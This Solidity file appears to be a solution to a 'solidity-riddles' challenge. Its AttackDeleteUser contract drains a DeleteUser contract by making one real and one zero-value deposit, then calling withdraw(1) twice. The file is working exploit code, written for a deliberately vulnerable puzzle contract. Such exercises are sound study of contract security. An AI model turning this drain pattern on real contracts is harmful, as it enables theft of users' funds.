// SPDX-License-Identifier: MIT
pragma solidity >=0.8.15;

import {DeleteUser} from "../solidity-riddles/DeleteUser.sol";

/**
 * @title AttackDeleteUser
 * Attacker can exploit withdraw function, by making a deposit of 1 ether and 0 ether and withdraw twice
 *
 */
contract AttackDeleteUser {
    DeleteUser deleteUser;

    function drainDeleteUser(DeleteUser _deleteUser) public payable {
        deleteUser = _deleteUser;
        // index 1
        deleteUser.deposit{value: msg.value}();
        // index 2
        deleteUser.deposit{value: 0}();
        // pop last value and receive 1 ether
        deleteUser.withdraw(1);
        deleteUser.withdraw(1);
    }

    receive() external payable {}
}
